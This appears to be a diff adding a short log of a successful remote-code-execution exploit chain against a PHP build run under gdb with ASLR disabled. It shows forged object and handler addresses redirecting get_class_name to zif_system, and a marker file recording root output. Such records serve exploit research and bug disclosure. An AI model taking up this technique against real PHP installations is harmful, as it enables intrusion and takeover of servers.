@@ -1,0 +1,11 @@
+== vdR3_call receipt: full RCE chain, plain2 8.5.12, gdb (ASLR off), argv=CHUNK/BASE ==
+cmd: gdb --args php -n vdR3_call.php 0140737308798976 0093824990838784
+
+forged: OBJ=0x7ffff54c3038 HT=0x7ffff54c3270 zif_system=0x555555923c60
+TRIGGERING var_dump($r1) -> handlers->get_class_name(obj)=zif_system(fake_execute_data)
+[Detaching after vfork from child process 1219765]
+*** stack smashing detected ***: terminated
+Program received signal SIGABRT, Aborted.
+
+== MARKER /tmp/pwned_zero4 ==
+uid=0(root) gid=0(root) groups=0(root)
